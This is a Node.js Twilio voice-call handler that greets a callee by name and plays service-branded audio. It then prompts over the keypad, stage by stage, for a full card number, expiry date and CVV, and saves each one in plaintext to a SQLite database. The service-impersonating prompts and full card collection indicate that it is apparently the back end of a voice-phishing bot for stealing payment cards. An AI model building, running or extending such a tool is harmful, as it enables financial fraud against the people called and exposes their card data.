module.exports = function(request, response) {
    const config = require('../config');
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');

    function buildTwiML({ say, playUrl, gatherDigits, nextPrompt, hangup }) {
        let twiml = '<?xml version="1.0" encoding="UTF-8"?><Response>';
        if (gatherDigits) {
            twiml += `<Gather timeout="8" numDigits="${gatherDigits}" action="/voice/${config.apipassword}" method="POST">`;
            if (say) twiml += `<Say>${say}</Say>`;
            if (playUrl) twiml += `<Play>${playUrl}</Play>`;
            if (nextPrompt) twiml += `<Say>${nextPrompt}</Say>`;
            twiml += '</Gather>';
        } else {
            if (say) twiml += `<Say>${say}</Say>`;
            if (playUrl) twiml += `<Play>${playUrl}</Play>`;
            if (nextPrompt) twiml += `<Say>${nextPrompt}</Say>`;
        }
        if (hangup) twiml += '<Hangup/>';
        twiml += '</Response>';
        return twiml;
    }

    const callSid = request.body.CallSid;
    const input = request.body.Digits || '';

    if (!callSid) {
        return response.type('text/xml').send(buildTwiML({ say: 'Sorry, an application error occurred. Goodbye.', hangup: true }));
    }

    db.get('SELECT service, name, card_stage FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err || !row) {
            return response.type('text/xml').send(buildTwiML({ say: 'Sorry, an application error occurred. Goodbye.', hangup: true }));
        }

        let service = row.service || 'default';
        let name = row.name ? row.name.trim() : '';
        let card_stage = row.card_stage || 'number';

        if (!config[service + 'filepath']) service = 'default';

        const welcomeAudioUrl = `${config.serverurl}/stream/${service}`;
        const endAudioUrl = `${config.serverurl}/stream/end`;

        let prompt, next_stage, gather_digits, regex, update_field;

        if (card_stage === 'number') {
            prompt = 'Please enter your 16-digit card number.';
            next_stage = 'expiry';
            gather_digits = 16;
            regex = /^\d{16}$/;
            update_field = 'card_number';

            if (!input) {
                const greeting = name ? `Hello ${name},` : 'Hello,';
                const twiml = buildTwiML({
                    say: greeting,
                    playUrl: welcomeAudioUrl,
                    gatherDigits: gather_digits,
                    nextPrompt: prompt
                });
                return response.type('text/xml').send(twiml);
            }
        } else if (card_stage === 'expiry') {
            prompt = 'Now enter your card expiry date as four digits, MMYY.';
            next_stage = 'cvv';
            gather_digits = 4;
            regex = /^\d{4}$/;
            update_field = 'card_expiry';
        } else if (card_stage === 'cvv') {
            prompt = 'Finally, enter your card CVV, three digits.';
            next_stage = 'done';
            gather_digits = 3;
            regex = /^\d{3}$/;
            update_field = 'card_cvv';
        } else {
            // End stage: play end audio and hang up
            db.run(`UPDATE calls SET card_stage = ? WHERE callSid = ?`, ['done', callSid]);
            const twiml = buildTwiML({
                playUrl: endAudioUrl,
                hangup: true
            });
            return response.type('text/xml').send(twiml);
        }

        // If input is valid for this stage, update DB and move to next stage
        if (input && regex && input.match(regex)) {
            db.run(`UPDATE calls SET ${update_field} = ?, card_stage = ? WHERE callSid = ?`, [input, next_stage, callSid], function(err) {
                if (err) {
                    return response.type('text/xml').send(buildTwiML({ say: 'Sorry, an application error occurred. Goodbye.', hangup: true }));
                }
                if (next_stage === 'done') {
                    const twiml = buildTwiML({
                        playUrl: endAudioUrl,
                        hangup: true
                    });
                    return response.type('text/xml').send(twiml);
                } else {
                    // Prompt for next stage
                    let nextPrompt, nextDigits;
                    if (next_stage === 'expiry') {
                        nextPrompt = 'Now enter your card expiry date as four digits, MMYY.';
                        nextDigits = 4;
                    } else if (next_stage === 'cvv') {
                        nextPrompt = 'Finally, enter your card CVV, three digits.';
                        nextDigits = 3;
                    }
                    const twiml = buildTwiML({
                        gatherDigits: nextDigits,
                        nextPrompt: nextPrompt
                    });
                    return response.type('text/xml').send(twiml);
                }
            });
        } else {
            // Invalid or missing input: re-prompt for current stage
            const twiml = buildTwiML({
                gatherDigits,
                nextPrompt: prompt
            });
            return response.type('text/xml').send(twiml);
        }
    });
};